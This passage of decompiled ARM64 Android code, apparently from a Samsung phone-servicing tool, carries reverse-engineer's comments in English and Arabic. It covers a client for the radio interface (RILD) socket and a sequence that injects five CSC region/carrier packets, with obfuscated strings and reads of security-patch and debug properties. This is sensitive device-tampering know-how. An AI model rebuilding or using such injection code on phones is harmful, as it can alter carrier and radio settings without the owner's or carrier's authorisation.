      if ((local_340[0] & 1) != 0) {
        free(local_330);
      }
      __s = *(char **)(param_1 + 0x10);
      local_278 = 0;
      uStack_272 = 0;
      local_270 = (void *)0x0;
      uVar18 = *param_3;
      local_280 = 0;
      uStack_27f = 0;
      uStack_27a = 0;
      sVar27 = param_3[1];
      sVar14 = strlen(__s);
      pbVar12 = (byte *)((long)param_3 + 1);
      sVar11 = (ulong)(byte)((byte)uVar18 >> 1);
      if (((byte)uVar18 & 1) != 0) {
        pbVar12 = (byte *)param_3[2];
        sVar11 = sVar27;
      }
      uVar18 = sVar11 + sVar14;
      if (0xffffffffffffffef < uVar18) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_280);
      }
      if (uVar18 < 0x17) {
        local_280 = (byte)((int)sVar11 << 1);
        pvVar15 = (void *)((ulong)&local_280 | 1);
      }
      else {
        uVar18 = uVar18 + 0x10 & 0xfffffffffffffff0;
        local_270 = (void *)FUN_00202bc0(uVar18);
        local_280 = (byte)uVar18 | 1;
        local_278 = (undefined6)sVar11;
        uStack_272 = (undefined2)(sVar11 >> 0x30);
        uStack_27f = (undefined5)(uVar18 >> 8);
        uStack_27a = (undefined2)(uVar18 >> 0x30);
        pvVar15 = local_270;
      }
      if (sVar11 != 0) {
        memcpy(pvVar15,pbVar12,sVar11);
      }
      *(undefined1 *)((long)pvVar15 + sVar11) = 0;
      FUN_0020417c(&local_280,__s,sVar14);
      sVar11 = strlen(acStack_268);
      if (0xffffffffffffffef < sVar11) {
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_2a8);
      }
      if (sVar11 < 0x17) {
        local_2a8 = (byte)((int)sVar11 << 1);
        pvVar15 = pvVar17;
        if (sVar11 != 0) goto LAB_001b735c;
      }
      else {
        uVar18 = sVar11 + 0x10 & 0xfffffffffffffff0;
        pvVar15 = (void *)FUN_00202bc0(uVar18);
        local_2a8 = (byte)uVar18 | 1;
        local_2a0 = (undefined6)sVar11;
        uStack_29a = (undefined2)(sVar11 >> 0x30);
        uStack_2a7 = (undefined5)(uVar18 >> 8);
        uStack_2a2 = (undefined2)(uVar18 >> 0x30);
        local_298 = pvVar15;
LAB_001b735c:
        memcpy(pvVar15,acStack_268,sVar11);
      }
      *(undefined1 *)((long)pvVar15 + sVar11) = 0;
      uVar18 = (ulong)(local_2a8 >> 1);
      pvVar15 = pvVar17;
      if ((local_2a8 & 1) != 0) {
        uVar18 = CONCAT26(uStack_29a,local_2a0);
        pvVar15 = local_298;
      }
      pbVar12 = (byte *)FUN_0020417c(&local_280,pvVar15,uVar18);
      uVar24 = *(undefined8 *)(pbVar12 + 8);
      uVar18 = *(ulong *)(pbVar12 + 0x10);
      bVar29 = *pbVar12;
      bVar2 = pbVar12[1];
      uVar19 = *(undefined8 *)(pbVar12 + 2);
      pbVar12[8] = 0;
      pbVar12[9] = 0;
      pbVar12[10] = 0;
      pbVar12[0xb] = 0;
      pbVar12[0xc] = 0;
      pbVar12[0xd] = 0;
      pbVar12[0xe] = 0;
      pbVar12[0xf] = 0;
      pbVar12[0x10] = 0;
      pbVar12[0x11] = 0;
      pbVar12[0x12] = 0;
      pbVar12[0x13] = 0;
      pbVar12[0x14] = 0;
      pbVar12[0x15] = 0;
      pbVar12[0x16] = 0;
      pbVar12[0x17] = 0;
      pbVar12[0] = 0;
      pbVar12[1] = 0;
      pbVar12[2] = 0;
      pbVar12[3] = 0;
      pbVar12[4] = 0;
      pbVar12[5] = 0;
      pbVar12[6] = 0;
      pbVar12[7] = 0;
      local_290 = (undefined6)uVar19;
      uStack_28a = (undefined2)uVar24;
      uStack_288 = (undefined6)((ulong)uVar24 >> 0x10);
      if ((*param_3 & 1) != 0) {
        free((void *)param_3[2]);
      }
      *(byte *)param_3 = bVar29;
      *(byte *)((long)param_3 + 1) = bVar2;
      param_3[2] = uVar18;
      *(ulong *)((long)param_3 + 2) = CONCAT26(uStack_28a,local_290);
      param_3[1] = CONCAT62(uStack_288,uStack_28a);
      if ((local_2a8 & 1) != 0) {
        free(local_298);
      }
      if ((local_280 & 1) != 0) {
        free(local_270);
      }
      if ((local_328 & 1) != 0) {
        *local_318 = 0;
        uStack_320 = 0;
        if ((local_328 & 1) != 0) {
          free(local_318);
        }
      }
      uVar20 = uVar20 + 1;
    } while (uVar20 != uVar22);
    FUN_001b6da4(acStack_268);
    pbVar12 = (byte *)FUN_002295c4(&DAT_00236050);
    if ((*pbVar12 & 1) == 0) {
      puVar28 = (undefined8 *)FUN_002295c4(&DAT_00236030);
      uVar24 = DAT_00177940;
      *(undefined4 *)(puVar28 + 1) = 0xe91e776;
      *puVar28 = uVar24;
      *(undefined2 *)((long)puVar28 + 0xc) = 0x1af;
      FUN_002234c0(&LAB_001b7660,puVar28,0x2362d0);
      puVar26 = (undefined1 *)FUN_002295c4(&DAT_00236050);
      *puVar26 = 1;
      lVar25 = FUN_002295c4(&DAT_00236030);
      cVar3 = *(char *)(lVar25 + 0xd);
    }
    else {
      lVar25 = FUN_002295c4(&DAT_00236030);
      cVar3 = *(char *)(lVar25 + 0xd);
    }
    if (cVar3 != '\0') {
      puVar28 = (undefined8 *)FUN_002295c4(&DAT_00236030);
      uVar24 = *puVar28;
      bVar29 = (byte)DAT_00177ae0;
      uVar22 = (ulong)DAT_00177ae0 >> 8;
      uVar20 = (ulong)DAT_00177ae0 >> 0x10;
      uVar18 = (ulong)DAT_00177ae0 >> 0x18;
      uVar7 = (ulong)DAT_00177ae0 >> 0x20;
      uVar8 = (ulong)DAT_00177ae0 >> 0x28;
      uVar9 = (ulong)DAT_00177ae0 >> 0x30;
      uVar10 = (ulong)DAT_00177ae0 >> 0x38;
      *(byte *)(puVar28 + 1) = *(byte *)(puVar28 + 1) ^ 0x45;
      *(byte *)((long)puVar28 + 9) = *(byte *)((long)puVar28 + 9) ^ 0xd5;
      *(byte *)((long)puVar28 + 10) = *(byte *)((long)puVar28 + 10) ^ 0xb1;
      *puVar28 = CONCAT17((byte)((ulong)uVar24 >> 0x38) ^ (byte)uVar10,
                          CONCAT16((byte)((ulong)uVar24 >> 0x30) ^ (byte)uVar9,
                                   CONCAT15((byte)((ulong)uVar24 >> 0x28) ^ (byte)uVar8,
                                            CONCAT14((byte)((ulong)uVar24 >> 0x20) ^ (byte)uVar7,
                                                     CONCAT13((byte)((ulong)uVar24 >> 0x18) ^
                                                              (byte)uVar18,
                                                              CONCAT12((byte)((ulong)uVar24 >> 0x10)
                                                                       ^ (byte)uVar20,
                                                                       CONCAT11((byte)((ulong)uVar24
                                                                                      >> 8) ^
                                                                                (byte)uVar22,
                                                                                (byte)uVar24 ^
                                                                                bVar29)))))));
      *(byte *)((long)puVar28 + 0xb) = *(byte *)((long)puVar28 + 0xb) ^ 0x3b;
      *(byte *)((long)puVar28 + 0xc) = *(byte *)((long)puVar28 + 0xc) ^ 0xaf;
      *(undefined1 *)((long)puVar28 + 0xd) = 0;
    }
    uVar24 = FUN_002295c4(&DAT_00236030);
    FUN_00204d38(&local_2e0,uVar24);
    FUN_0019b934(&local_328,param_3,&local_2e0);
    if ((*param_3 & 1) != 0) {
      free((void *)param_3[2]);
    }
    param_3[1] = uStack_320;
    *param_3 = local_328;
    param_3[2] = (ulong)local_318;
    if ((local_2e0 & 1) != 0) {
      uVar21 = 0;
      *local_2d0 = 0;
      uStack_2d8 = 0;
      goto joined_r0x001b7564;
    }
    uVar21 = 0;
    local_2e0 = local_2e0 & 0xffffffffffff0000;
  }
  if ((local_2c0[0] & 1) == 0) {
    if (*(long *)(lVar5 + 0x28) != local_68) {
LAB_001b75c4:
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  }
  else {
    free(local_2b0);
    if (*(long *)(lVar5 + 0x28) != local_68) goto LAB_001b75c4;
  }
  return uVar21;
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001b766c
 * Purpose (EN): RILD Socket Client & Parcel Transmitter
 * Purpose (AR): الاتصال بسوكيت /dev/socket/rild وتغليف Parcel وإرساله
 */

// Function: FUN_001b766c @ 001b766c
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001b766c(undefined8 *param_1)

{
  undefined8 *puVar1;
  void *__src;
  byte *pbVar2;
  void *pvVar3;
  byte bVar4;
  long lVar5;
  size_t sVar6;
  void *pvVar7;
  undefined8 uVar8;
  int iVar9;
  undefined8 uVar10;
  time_t tVar11;
  size_t sVar12;
  undefined8 *puVar13;
  ulong *puVar14;
  size_t sVar15;
  void *__dest;
  ulong uVar16;
  byte local_12f0 [16];
  void *local_12e0;
  byte local_12d8 [16];
  void *local_12c8;
  byte local_12c0 [16];
  void *local_12b0;
  byte local_12a8 [16];
  void *local_1298;
  byte local_1290 [16];
  void *local_1280;
  undefined2 local_1278;
  undefined6 uStack_1276;
  undefined8 uStack_1270;
  undefined8 local_1268;
  byte local_1260 [16];
  void *local_1250;
  byte local_1248 [16];
  void *local_1238;
  byte local_1230 [16];
  void *local_1220;
  byte local_1218 [16];
  void *local_1208;
  ulong local_1200;
  size_t sStack_11f8;
  void *local_11f0;
  byte local_11e8 [16];
  void *local_11d8;
  undefined2 local_11d0;
  undefined6 uStack_11ce;
  undefined8 uStack_11c8;
  undefined8 local_11c0;
  char local_1d0 [8];
  char acStack_1c8 [8];
  undefined4 local_1c0;
  undefined2 local_1bc;
  undefined1 local_1ba;
  char local_1b0 [8];
  char acStack_1a8 [8];
  undefined4 local_1a0;
  undefined8 local_190;
  undefined8 uStack_188;
  undefined4 local_180;
  undefined1 local_17c;
  undefined8 local_170;
  undefined8 uStack_168;
  undefined8 local_160;
  undefined4 local_158;
  undefined1 local_154;
  undefined8 local_150;
  undefined8 uStack_148;
  char local_140 [8];
  char acStack_138 [8];
  undefined8 local_130;
  undefined8 uStack_128;
  undefined8 local_120;
  undefined1 local_118;
  undefined8 local_110;
  undefined4 local_108;
  undefined8 local_100;
  undefined8 uStack_f8;
  undefined1 local_f0;
  undefined8 local_e0;
  undefined8 uStack_d8;
  char local_d0 [8];
  undefined1 auStack_c4 [92];
  long local_68;
  
  lVar5 = tpidr_el0;
  puVar1 = param_1 + 1;
  local_68 = *(long *)(lVar5 + 0x28);
  FUN_001b9b9c(puVar1);
  uStack_d8 = _UNK_00177678;
  local_e0 = _DAT_00177670;
  param_1[0x4c] = 0;
  param_1[0x4b] = 0;
  param_1[0x4e] = 0;
  param_1[0x4d] = 0;
  param_1[0x50] = 0;
  param_1[0x4f] = 0;
  param_1[0x54] = 0;
  param_1[0x53] = 0;
  param_1[0x56] = 0;
  param_1[0x55] = 0;
  param_1[0x5a] = 0;
  param_1[0x59] = 0;
  param_1[0x5c] = 0;
  param_1[0x5b] = 0;
  param_1[0x60] = 0;
  param_1[0x5f] = 0;
  param_1[0x62] = 0;
  param_1[0x61] = 0;
  param_1[0x66] = 0;
  param_1[0x65] = 0;
  param_1[0x68] = 0;
  param_1[0x67] = 0;
  param_1[0x6a] = 0;
  param_1[0x69] = 0;
  param_1[0x6c] = 0;
  param_1[0x6b] = 0;
  param_1[0x6e] = 0;
  param_1[0x6d] = 0;
  param_1[0x70] = 0;
  param_1[0x6f] = 0;
  param_1[0x72] = 0;
  param_1[0x71] = 0;
  param_1[0x74] = 0;
  param_1[0x73] = 0;
  param_1[100] = 0;
  param_1[99] = 0;
  param_1[0x5e] = 0;
  param_1[0x5d] = 0;
  param_1[0x58] = 0;
  param_1[0x57] = 0;
  puVar13 = param_1 + 0x51;
  param_1[0x52] = 0;
  *puVar13 = 0;
  local_d0[0] = s_acturer_001779e0[0];
  local_d0[1] = s_acturer_001779e0[1];
  local_d0[2] = s_acturer_001779e0[2];
  local_d0[3] = s_acturer_001779e0[3];
  local_d0[4] = s_acturer_001779e0[4];
  local_d0[5] = s_acturer_001779e0[5];
  local_d0[6] = s_acturer_001779e0[6];
  local_d0[7] = s_acturer_001779e0[7];
  *param_1 = &PTR_FUN_0022b720;
  __system_property_get(&local_e0,auStack_c4);
  FUN_00204d38(param_1 + 0x4b,auStack_c4);
  local_f0 = 0;
  uStack_f8 = _UNK_00177218;
  local_100 = _DAT_00177210;
  __system_property_get(&local_100,auStack_c4);
  FUN_00204d38(param_1 + 0x4e,auStack_c4);
  local_110 = DAT_001778e0;
  local_108 = 0x6f6e6c;
  __system_property_get(&local_110,auStack_c4);
  FUN_00204d38(puVar13,auStack_c4);
  uVar8 = _UNK_001772b8;
  uVar10 = _DAT_001772b0;
  local_118 = 0;
  uStack_128 = _UNK_001772b8;
  local_130 = _DAT_001772b0;
  local_120 = DAT_00177998;
  __system_property_get(&local_130,auStack_c4);
  FUN_00204d38(param_1 + 0x54,auStack_c4);
  uStack_148 = uVar8;
  local_150 = uVar10;
  acStack_138[0] = s__security_patch_001774f0[8];
  acStack_138[1] = s__security_patch_001774f0[9];
  acStack_138[2] = s__security_patch_001774f0[10];
  acStack_138[3] = s__security_patch_001774f0[0xb];
  acStack_138[4] = s__security_patch_001774f0[0xc];
  acStack_138[5] = s__security_patch_001774f0[0xd];
  acStack_138[6] = s__security_patch_001774f0[0xe];
  acStack_138[7] = s__security_patch_001774f0[0xf];
  local_140[0] = s__security_patch_001774f0[0];
  local_140[1] = s__security_patch_001774f0[1];
  local_140[2] = s__security_patch_001774f0[2];
  local_140[3] = s__security_patch_001774f0[3];
  local_140[4] = s__security_patch_001774f0[4];
  local_140[5] = s__security_patch_001774f0[5];
  local_140[6] = s__security_patch_001774f0[6];
  local_140[7] = s__security_patch_001774f0[7];
  __system_property_get(&local_150,auStack_c4);
  FUN_00204d38(param_1 + 0x57,auStack_c4);
  local_154 = 0;
  uStack_168 = uVar8;
  local_170 = uVar10;
  local_158 = 0x6c61746e;
  local_160 = DAT_001778e8;
  __system_property_get(&local_170,auStack_c4);
  FUN_00204d38(param_1 + 0x5a,auStack_c4);
  local_17c = 0;
  local_180 = 0x6b64732e;
  uStack_188 = uVar8;
  local_190 = uVar10;
  __system_property_get(&local_190,auStack_c4);
  FUN_00204d38(param_1 + 0x5d,auStack_c4);
  acStack_1a8[0] = s_ro_boot_debug_le1_00176ba0[8];
  acStack_1a8[1] = s_ro_boot_debug_le1_00176ba0[9];
  acStack_1a8[2] = s_ro_boot_debug_le1_00176ba0[10];
  acStack_1a8[3] = s_ro_boot_debug_le1_00176ba0[0xb];
  acStack_1a8[4] = s_ro_boot_debug_le1_00176ba0[0xc];
  acStack_1a8[5] = s_ro_boot_debug_le1_00176ba0[0xd];
  acStack_1a8[6] = s_ro_boot_debug_le1_00176ba0[0xe];
  acStack_1a8[7] = s_ro_boot_debug_le1_00176ba0[0xf];
  local_1b0[0] = s_ro_boot_debug_le1_00176ba0[0];
  local_1b0[1] = s_ro_boot_debug_le1_00176ba0[1];
  local_1b0[2] = s_ro_boot_debug_le1_00176ba0[2];
  local_1b0[3] = s_ro_boot_debug_le1_00176ba0[3];
  local_1b0[4] = s_ro_boot_debug_le1_00176ba0[4];
  local_1b0[5] = s_ro_boot_debug_le1_00176ba0[5];
  local_1b0[6] = s_ro_boot_debug_le1_00176ba0[6];
  local_1b0[7] = s_ro_boot_debug_le1_00176ba0[7];
  local_1a0 = 0x6c6576;
  __system_property_get(local_1b0,auStack_c4);
  FUN_00204d38(param_1 + 0x60,auStack_c4);
  local_1ba = 0;
  local_1c0 = 0x76656c5f;
  local_1bc = 0x6c65;
  acStack_1c8[0] = s_ro_boot_cp_debug_00177080[8];
  acStack_1c8[1] = s_ro_boot_cp_debug_00177080[9];
  acStack_1c8[2] = s_ro_boot_cp_debug_00177080[10];
  acStack_1c8[3] = s_ro_boot_cp_debug_00177080[0xb];
  acStack_1c8[4] = s_ro_boot_cp_debug_00177080[0xc];
  acStack_1c8[5] = s_ro_boot_cp_debug_00177080[0xd];
  acStack_1c8[6] = s_ro_boot_cp_debug_00177080[0xe];
  acStack_1c8[7] = s_ro_boot_cp_debug_00177080[0xf];
  local_1d0[0] = s_ro_boot_cp_debug_00177080[0];
  local_1d0[1] = s_ro_boot_cp_debug_00177080[1];
  local_1d0[2] = s_ro_boot_cp_debug_00177080[2];
  local_1d0[3] = s_ro_boot_cp_debug_00177080[3];
  local_1d0[4] = s_ro_boot_cp_debug_00177080[4];
  local_1d0[5] = s_ro_boot_cp_debug_00177080[5];
  local_1d0[6] = s_ro_boot_cp_debug_00177080[6];
  local_1d0[7] = s_ro_boot_cp_debug_00177080[7];
  __system_property_get(local_1d0,auStack_c4);
  FUN_00204d38(param_1 + 99,auStack_c4);
  uVar10 = FUN_002036bc(local_11e8,puVar13);
  FUN_001b80e4(&local_11d0,uVar10,local_11e8);
  if ((*(byte *)(param_1 + 0x6c) & 1) != 0) {
    free((void *)param_1[0x6e]);
  }
  uVar10 = CONCAT62(uStack_11ce,local_11d0);
  local_11d0 = 0;
  param_1[0x6d] = uStack_11c8;
  param_1[0x6c] = uVar10;
  param_1[0x6e] = local_11c0;
  if ((local_11e8[0] & 1) != 0) {
    free(local_11d8);
  }
  tVar11 = time((time_t *)0x0);
  srand((uint)tVar11);
  __src = (void *)((long)param_1 + 0x331);
  iVar9 = rand();
  FUN_001b8484(&local_11d0,0x1000,&DAT_0013d310,iVar9);
  bVar4 = *(byte *)(param_1 + 0x66);
  sVar15 = param_1[0x67];
  local_1200 = 0;
  sStack_11f8 = 0;
  local_11f0 = (void *)0x0;
  sVar12 = strlen((char *)&local_11d0);
  pvVar3 = __src;
  sVar6 = (ulong)(bVar4 >> 1);
  if ((bVar4 & 1) != 0) {
    pvVar3 = (void *)param_1[0x68];
    sVar6 = sVar15;
  }
  uVar16 = sVar6 + sVar12;
  if (uVar16 < 0xfffffffffffffff0) {
    __dest = (void *)((ulong)&local_1200 | 1);
    if (uVar16 < 0x17) {
      local_1200 = CONCAT71(local_1200._1_7_,(char)((int)sVar6 << 1));
      pvVar7 = __dest;
    }
    else {
      uVar16 = uVar16 + 0x10 & 0xfffffffffffffff0;
      local_11f0 = (void *)FUN_00202bc0(uVar16);
      local_1200 = uVar16 | 1;
      pvVar7 = local_11f0;
      sStack_11f8 = sVar6;
    }
    if (sVar6 != 0) {
      memcpy(pvVar7,pvVar3,sVar6);
    }
    puVar14 = param_1 + 0x66;
    *(undefined1 *)((long)pvVar7 + sVar6) = 0;
    FUN_0020417c(&local_1200,&local_11d0,sVar12);
    if ((*puVar14 & 1) != 0) {
      free((void *)param_1[0x68]);
    }
    param_1[0x67] = sStack_11f8;
    *puVar14 = local_1200;
    param_1[0x68] = local_11f0;
    iVar9 = rand();
    FUN_001b8484(&local_11d0,0x1000,&DAT_0013d310,iVar9);
    bVar4 = *(byte *)(param_1 + 0x66);
    sVar15 = param_1[0x67];
    local_1200 = 0;
    sStack_11f8 = 0;
    local_11f0 = (void *)0x0;
    sVar12 = strlen((char *)&local_11d0);
    pvVar3 = __src;
    sVar6 = (ulong)(bVar4 >> 1);
    if ((bVar4 & 1) != 0) {
      pvVar3 = (void *)param_1[0x68];
      sVar6 = sVar15;
    }
    uVar16 = sVar6 + sVar12;
    if (uVar16 < 0xfffffffffffffff0) {
      if (uVar16 < 0x17) {
        local_1200 = CONCAT71(local_1200._1_7_,(char)((int)sVar6 << 1));
        pvVar7 = __dest;
      }
      else {
        uVar16 = uVar16 + 0x10 & 0xfffffffffffffff0;
        local_11f0 = (void *)FUN_00202bc0(uVar16);
        local_1200 = uVar16 | 1;
        pvVar7 = local_11f0;
        sStack_11f8 = sVar6;
      }
      if (sVar6 != 0) {
        memcpy(pvVar7,pvVar3,sVar6);
      }
      *(undefined1 *)((long)pvVar7 + sVar6) = 0;
      FUN_0020417c(&local_1200,&local_11d0,sVar12);
      if ((*puVar14 & 1) != 0) {
        free((void *)param_1[0x68]);
      }
      param_1[0x67] = sStack_11f8;
      *puVar14 = local_1200;
      param_1[0x68] = local_11f0;
      iVar9 = rand();
      FUN_001b8484(&local_11d0,0x1000,&DAT_0013d310,iVar9);
      bVar4 = *(byte *)(param_1 + 0x66);
      sVar15 = param_1[0x67];
      local_1200 = 0;
      sStack_11f8 = 0;
      local_11f0 = (void *)0x0;
      sVar12 = strlen((char *)&local_11d0);
      pvVar3 = __src;
      sVar6 = (ulong)(bVar4 >> 1);
      if ((bVar4 & 1) != 0) {
        pvVar3 = (void *)param_1[0x68];
        sVar6 = sVar15;
      }
      uVar16 = sVar6 + sVar12;
      if (uVar16 < 0xfffffffffffffff0) {
        if (uVar16 < 0x17) {
          local_1200 = CONCAT71(local_1200._1_7_,(char)((int)sVar6 << 1));
          pvVar7 = __dest;
        }
        else {
          uVar16 = uVar16 + 0x10 & 0xfffffffffffffff0;
          local_11f0 = (void *)FUN_00202bc0(uVar16);
          local_1200 = uVar16 | 1;
          pvVar7 = local_11f0;
          sStack_11f8 = sVar6;
        }
        if (sVar6 != 0) {
          memcpy(pvVar7,pvVar3,sVar6);
        }
        *(undefined1 *)((long)pvVar7 + sVar6) = 0;
        FUN_0020417c(&local_1200,&local_11d0,sVar12);
        if ((*puVar14 & 1) != 0) {
          free((void *)param_1[0x68]);
        }
        param_1[0x67] = sStack_11f8;
        *puVar14 = local_1200;
        param_1[0x68] = local_11f0;
        iVar9 = rand();
        FUN_001b8484(&local_11d0,0x1000,&DAT_0013d310,iVar9);
        bVar4 = *(byte *)(param_1 + 0x66);
        sVar15 = param_1[0x67];
        local_1200 = 0;
        sStack_11f8 = 0;
        local_11f0 = (void *)0x0;
        sVar12 = strlen((char *)&local_11d0);
        pvVar3 = __src;
        sVar6 = (ulong)(bVar4 >> 1);
        if ((bVar4 & 1) != 0) {
          pvVar3 = (void *)param_1[0x68];
          sVar6 = sVar15;
        }
        uVar16 = sVar6 + sVar12;
        if (uVar16 < 0xfffffffffffffff0) {
          if (uVar16 < 0x17) {
            local_1200 = CONCAT71(local_1200._1_7_,(char)((int)sVar6 << 1));
            pvVar7 = __dest;
          }
          else {
            uVar16 = uVar16 + 0x10 & 0xfffffffffffffff0;
            local_11f0 = (void *)FUN_00202bc0(uVar16);
            local_1200 = uVar16 | 1;
            pvVar7 = local_11f0;
            sStack_11f8 = sVar6;
          }
          if (sVar6 != 0) {
            memcpy(pvVar7,pvVar3,sVar6);
          }
          *(undefined1 *)((long)pvVar7 + sVar6) = 0;
          FUN_0020417c(&local_1200,&local_11d0,sVar12);
          if ((*puVar14 & 1) != 0) {
            free((void *)param_1[0x68]);
          }
          param_1[0x67] = sStack_11f8;
          *puVar14 = local_1200;
          param_1[0x68] = local_11f0;
          iVar9 = rand();
          FUN_001b8484(&local_11d0,0x1000,&DAT_0013d310,iVar9);
          bVar4 = *(byte *)(param_1 + 0x66);
          sVar15 = param_1[0x67];
          local_1200 = 0;
          sStack_11f8 = 0;
          local_11f0 = (void *)0x0;
          sVar12 = strlen((char *)&local_11d0);
          sVar6 = (ulong)(bVar4 >> 1);
          if ((bVar4 & 1) != 0) {
            __src = (void *)param_1[0x68];
            sVar6 = sVar15;
          }
          uVar16 = sVar6 + sVar12;
          if (uVar16 < 0xfffffffffffffff0) {
            if (uVar16 < 0x17) {
              local_1200 = CONCAT71(local_1200._1_7_,(char)((int)sVar6 << 1));
            }
            else {
              uVar16 = uVar16 + 0x10 & 0xfffffffffffffff0;
              __dest = (void *)FUN_00202bc0(uVar16);
              local_1200 = uVar16 | 1;
              local_11f0 = __dest;
              sStack_11f8 = sVar6;
            }
            if (sVar6 != 0) {
              memcpy(__dest,__src,sVar6);
            }
            *(undefined1 *)((long)__dest + sVar6) = 0;
            FUN_0020417c(&local_1200,&local_11d0,sVar12);
            if ((*puVar14 & 1) != 0) {
              free((void *)param_1[0x68]);
            }
            param_1[0x67] = sStack_11f8;
            *puVar14 = local_1200;
            param_1[0x68] = local_11f0;
            FUN_002036bc(local_1218,puVar14);
            FUN_001bac64(&local_1200,puVar1,local_1218);
            if ((*puVar14 & 1) != 0) {
              free((void *)param_1[0x68]);
            }
            uVar16 = local_1200;
            local_1200 = local_1200 & 0xffffffffffff0000;
            param_1[0x67] = sStack_11f8;
            *puVar14 = uVar16;
            param_1[0x68] = local_11f0;
            if ((local_1218[0] & 1) != 0) {
              free(local_1208);
            }
            uVar10 = FUN_002036bc(local_1230,puVar14);
            FUN_001b80e4(&local_1200,uVar10,local_1230);
            puVar14 = param_1 + 0x69;
            if ((*(byte *)(param_1 + 0x69) & 1) != 0) {
              free((void *)param_1[0x6b]);
            }
            uVar16 = local_1200;
            local_1200 = local_1200 & 0xffffffffffff0000;
            param_1[0x6a] = sStack_11f8;
            *puVar14 = uVar16;
            param_1[0x6b] = local_11f0;
            if ((local_1230[0] & 1) != 0) {
              free(local_1220);
            }
            FUN_002036bc(local_1248,puVar14);
            FUN_001ba254(&local_1200,puVar1,local_1248);
            if ((*puVar14 & 1) != 0) {
              free((void *)param_1[0x6b]);
            }
            uVar16 = local_1200;
            local_1200 = local_1200 & 0xffffffffffff0000;
            param_1[0x6a] = sStack_11f8;
            *puVar14 = uVar16;
            param_1[0x6b] = local_11f0;
            if ((local_1248[0] & 1) != 0) {
              free(local_1238);
            }
            FUN_002036bc(local_1260,param_1 + 0x6c);
            FUN_001ba254(&local_1200,puVar1,local_1260);
            if ((local_1260[0] & 1) != 0) {
              free(local_1250);
            }
            FUN_002036bc(local_1290,&local_1200);
            FUN_002036bc(local_12a8,puVar14);
            FUN_001bb2ac(&local_1278,puVar1,local_1290,local_12a8);
            pbVar2 = (byte *)(param_1 + 0x6f);
            if ((*(byte *)(param_1 + 0x6f) & 1) != 0) {
              free((void *)param_1[0x71]);
            }
            uVar10 = CONCAT62(uStack_1276,local_1278);
            local_1278 = 0;
            param_1[0x70] = uStack_1270;
            *(undefined8 *)pbVar2 = uVar10;
            param_1[0x71] = local_1268;
            if ((local_12a8[0] & 1) != 0) {
              free(local_1298);
            }
            if ((local_1290[0] & 1) != 0) {
              free(local_1280);
            }
            uVar16 = (ulong)(*(byte *)(param_1 + 0x6f) >> 1);
            if ((*(byte *)(param_1 + 0x6f) & 1) != 0) {
              uVar16 = param_1[0x70];
            }
            if (uVar16 < 5) {
              FUN_002036bc(local_12c0,puVar14);
              FUN_002036bc(local_12d8,&local_1200);
              FUN_001bb2ac(&local_1278,puVar1,local_12c0,local_12d8);
              if ((*pbVar2 & 1) != 0) {
                free((void *)param_1[0x71]);
              }
              uVar10 = CONCAT62(uStack_1276,local_1278);
              local_1278 = 0;
              param_1[0x70] = uStack_1270;
              *(undefined8 *)pbVar2 = uVar10;
              param_1[0x71] = local_1268;
              if ((local_12d8[0] & 1) != 0) {
                free(local_12c8);
              }
              if ((local_12c0[0] & 1) != 0) {
                free(local_12b0);
              }
            }
            FUN_002036bc(local_12f0,pbVar2);
            FUN_001bac64(&local_1278,puVar1,local_12f0);
            if ((*pbVar2 & 1) != 0) {
              free((void *)param_1[0x71]);
            }
            uVar10 = CONCAT62(uStack_1276,local_1278);
            local_1278 = 0;
            param_1[0x70] = uStack_1270;
            *(undefined8 *)pbVar2 = uVar10;
            param_1[0x71] = local_1268;
            if ((local_12f0[0] & 1) != 0) {
              free(local_12e0);
            }
            uVar16 = (ulong)(*(byte *)(param_1 + 0x6f) >> 1);
            if ((*(byte *)(param_1 + 0x6f) & 1) != 0) {
              uVar16 = param_1[0x70];
            }
            if (uVar16 < 0x38) {
              printf("\n\nRil Token Error, Try Again");
                    /* WARNING: Subroutine does not return */
              exit(0);
            }
            if ((local_1200 & 1) != 0) {
              free(local_11f0);
            }
            if (*(long *)(lVar5 + 0x28) != local_68) {
                    /* WARNING: Subroutine does not return */
              __stack_chk_fail();
            }
            return;
          }
        }
      }
    }
  }
                    /* WARNING: Subroutine does not return */
  FUN_00203188(&local_1200);
}



// ----------------------------------------------------------------




// ============================================================================
// MODULE 5: Samsung CSC Injection & Cleanup (حقن الـ CSC وتنظيف الحزم)
// ============================================================================


/*
 * [PHONE FUNCTION] FUN_001a5c50
 * Purpose (EN): Samsung CSC 5-Packet Injection Sequence
 * Purpose (AR): تسلسل حقن حزم CSC الخمس (0601... الخ)
 */

// Function: FUN_001a5c50 @ 001a5c50
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001a5c50(void)

{
  char cVar1;
  long lVar2;
  void *pvVar3;
  ulong uVar4;
  ulong uVar5;
  ulong uVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  FILE *__stream;
  int iVar10;
  int iVar11;
  byte *pbVar12;
  long lVar13;
  undefined8 *puVar14;
  ulong uVar15;
  char *pcVar16;
  undefined8 uVar17;
  undefined1 *puVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  byte bVar26;
  byte bVar27;
  byte bVar29;
  byte bVar30;
  byte bVar31;
  byte bVar32;
  byte bVar33;
  byte bVar34;
  undefined8 uVar28;
  byte bVar35;
  undefined8 uVar36;
  undefined8 uVar37;
  undefined8 uVar38;
  undefined8 uVar39;
  undefined8 uVar40;
  undefined8 uVar41;
  byte local_1c0 [8];
  ulong local_1b8;
  void *local_1b0;
  undefined **local_1a8;
  long local_1a0 [3];
  uint auStack_188 [24];
  FILE *local_128;
  undefined4 local_108;
  undefined **local_f8 [17];
  undefined8 local_70;
  undefined4 local_68;
  undefined8 local_60;
  undefined8 uStack_58;
  undefined2 local_50;
  undefined1 local_4e;
  long local_48;
  
  lVar2 = tpidr_el0;
  local_48 = *(long *)(lVar2 + 0x28);
  pbVar12 = (byte *)FUN_002295c4(&DAT_002357d0);
  if ((*pbVar12 & 1) == 0) {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_002357b0);
    uVar28 = _UNK_00176ea8;
    uVar17 = _DAT_00176ea0;
    *(undefined1 *)(puVar14 + 2) = 1;
    puVar14[1] = uVar28;
